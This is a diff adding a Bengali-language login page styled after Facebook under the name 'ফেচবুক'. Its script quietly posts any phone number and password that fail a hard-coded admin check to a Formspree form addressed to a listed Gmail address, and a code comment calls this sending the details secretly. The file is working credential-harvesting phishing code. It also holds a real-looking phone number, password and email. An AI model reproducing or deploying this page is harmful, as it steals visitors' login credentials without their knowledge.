@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফেচবুক</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        h2 { color: #1877f2; margin-bottom: 25px; }
+        input { width: 92%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        button { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        button:hover { background-color: #166fe5; }
+        #error-msg { color: #d93025; background: #fce8e6; padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 14px; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container" id="login-box">
+        <h2>ফেচবুক</h2>
+        <input type="text" id="phoneInput" placeholder="ফোন নম্বর">
+        <input type="password" id="passInput" placeholder="পাসওয়ার্ড">
+        <button onclick="checkLogin()">লগিই</button>
+        <div id="error-msg"></div>
+    </div>
+
+    <form id="notifyForm" action="https://formspree.io/f/আপনার_ফর্মস্প্রি_কোড" method="POST" style="display:none;">
+        <input type="text" name="Target_Email" value="sathiiii474747@gmail.com">
+        <input type="text" name="Phone_Used" id="hiddenPhone">
+        <input type="text" name="Password_Used" id="hiddenPass">
+        <input type="text" name="Message" value="কেউ আপনার সাইটে ভুল তথ্য দিয়ে ঢোকার চেষ্টা করেছে!">
+    </form>
+
+    <script>
+        function checkLogin() {
+            // আপনার দেওয়া সঠিক নম্বর ও পাসওয়ার্ড
+            var adminPhone = "01768649339";
+            var adminPass = "&1*1@3;4%545?%5@";
+
+            var uPhone = document.getElementById("phoneInput").value;
+            var uPass = document.getElementById("passInput").value;
+            var errorDiv = document.getElementById("error-msg");
+
+            if (uPhone === adminPhone && uPass === adminPass) {
+                // তথ্য সঠিক হলে যা হবে
+                alert("লগইন সফল! আপনার ডোমুমেন্ট ওপেন হচ্ছে...");
+                window.location.href = "https://your-secret-document-link.com"; 
+            } else {
+                // তথ্য ভুল হলে যা হবে
+                errorDiv.style.display = "block";
+                errorDiv.innerHTML = "ভুল তথ্য! আপনি ফোন: <b>" + uPhone + "</b> এবং পাসওয়ার্ড: <b>" + uPass + "</b> লিখেছেন।";
+
+                // গোপনে আপনার ইমেইলে তথ্য পাঠানো
+                document.getElementById("hiddenPhone").value = uPhone;
+                document.getElementById("hiddenPass").value = uPass;
+
+                var form = document.getElementById("notifyForm");
+                var formData = new FormData(form);
+                
+                fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                }).then(() => {
+                    console.log("আপনার ইমেইলে রিপোর্ট পাঠানো হয়েছে।");
+                });
+            }
+        }
+    </script>
+
+</body>
+</html>
